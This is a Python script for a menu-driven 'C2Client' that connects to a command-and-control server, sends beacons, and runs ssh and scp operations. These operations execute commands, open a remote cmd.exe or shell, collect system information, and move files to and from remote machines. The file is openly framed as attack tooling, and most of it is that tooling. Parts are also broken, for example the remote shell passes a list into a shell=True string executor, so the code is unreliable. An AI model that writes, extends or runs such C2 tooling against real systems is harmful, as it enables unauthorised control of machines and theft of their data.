import socket
import subprocess
import logging

logging.basicConfig(level=logging.INFO)

class C2Client:
    def __init__(self):
        self.c2_server = None
        self.c2_port = None
        self.socket = None

    def connect_to_c2_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_server, self.c2_port))
            logging.info("Connected to C2 server.")
        except ConnectionRefusedError:
            logging.error("Connection to C2 server refused. Please check the server address and port.")
        except socket.error as e:
            logging.error(f"Socket connection error: {e}")

    def send_beacon(self, message):
        try:
            self.socket.send(message.encode())
            logging.info("Beacon message sent to C2 server.")
        except socket.error as e:
            logging.error(f"Failed to send beacon message: {e}")

    def receive_instructions(self):
        try:
            instructions = self.socket.recv(1024).decode()
            logging.info("Received instructions from C2 server: %s", instructions)
            return instructions
        except socket.error as e:
            logging.error(f"Failed to receive instructions: {e}")

    def close(self):
        if self.socket:
            self.socket.close()
            logging.info("Socket connection closed.")

    def execute_command(self, command):
        if command == "exit":
            # Handle the exit command
            return "Exiting shell..."
        else:
            # Execute the command on the remote machine
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return output.decode()
            except subprocess.CalledProcessError as e:
                return f"Error executing command: {e.output.decode()}"

    def open_command_prompt(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", "cmd.exe"])
            logging.info("Command prompt opened on the remote Windows machine.")
        except subprocess.CalledProcessError:
            logging.error("Failed to open command prompt on the remote machine.")

    def execute_remote_command(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        command = input("Enter the command to execute on the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", command], check=True)
            logging.info("Command executed on the remote machine: %s", command)
        except subprocess.CalledProcessError:
            logging.error("Failed to execute the command on the remote machine.")

    def download_file_from_remote(self):
        file_path = input("Enter the path of the file to download from the remote machine: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["scp", f"{remote_username}@{remote_machine}:{file_path}", "."], check=True)
            logging.info("File downloaded from the remote machine: %s", file_path)
        except subprocess.CalledProcessError:
            logging.error("Failed to download the file from the remote machine.")

    def upload_file_to_remote(self):
        local_file_path = input("Enter the path of the local file to upload: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        remote_file_path = input("Enter the destination path on the remote machine: ")
        try:
            subprocess.run(["scp", local_file_path, f"{remote_username}@{remote_machine}:{remote_file_path}"], check=True)
            logging.info("File uploaded to the remote machine: %s -> %s", local_file_path, remote_file_path)
        except subprocess.CalledProcessError:
            logging.error("Failed to upload the file to the remote machine.")

    def run_script_on_remote(self):
        script_path = input("Enter the path of the script to run on the remote machine: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", f"python {script_path}"], check=True)
            logging.info("Script executed on the remote machine: %s", script_path)
        except subprocess.CalledProcessError:
            logging.error("Failed to execute the script on the remote machine.")

    def retrieve_system_info(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", "systeminfo"], check=True)
            logging.info("System information retrieved from the remote machine.")
        except subprocess.CalledProcessError:
            logging.error("Failed to retrieve system information from the remote machine.")

    def remote_shell_interaction(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        logging.info("Enter 'exit' to exit the remote shell.")
        while True:
            command = input("Remote Shell $ ")
            output = self.execute_command(["ssh", f"{remote_username}@{remote_machine}", command])
            if output:
                print(output)
            if command == "exit":
                break

    def handle_instruction(self, instruction):
        if instruction == "open_cmd":
            self.open_command_prompt()
        elif instruction == "execute_command":
            self.execute_remote_command()
        elif instruction == "download_file":
            self.download_file_from_remote()
        elif instruction == "upload_file":
            self.upload_file_to_remote()
        elif instruction == "run_script":
            self.run_script_on_remote()
        elif instruction == "get_system_info":
            self.retrieve_system_info()
        elif instruction == "remote_shell":
            self.remote_shell_interaction()
        else:
            logging.error("Unknown instruction: %s", instruction)

def main():
    client = C2Client()

    while True:
        logging.info("C2 Client Menu:")
        logging.info("1. Connect to C2 server")
        logging.info("2. Disconnect from C2 server")
        logging.info("3. Pass instruction")
        logging.info("4. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            client.c2_server = input("Enter C2 server address: ")
            client.c2_port = int(input("Enter C2 server port: "))
            client.connect_to_c2_server()

        elif choice == "2":
            client.close()

        elif choice == "3":
            logging.info("Instruction Examples:")
            logging.info("1. Open command prompt on the remote Windows machine (open_cmd)")
            logging.info("2. Execute a command on the remote machine (execute_command)")
            logging.info("3. Download a file from the remote machine (download_file)")
            logging.info("4. Upload a file to the remote machine (upload_file)")
            logging.info("5. Run a script on the remote machine (run_script)")
            logging.info("6. Retrieve system information from the remote machine (get_system_info)")
            logging.info("7. Start a remote shell interaction (remote_shell)")

            instruction = input("Enter the instruction: ")
            client.send_beacon(instruction)
            client.handle_instruction(instruction)

        elif choice == "4":
            client.close()
            break

        else:
            logging.error("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
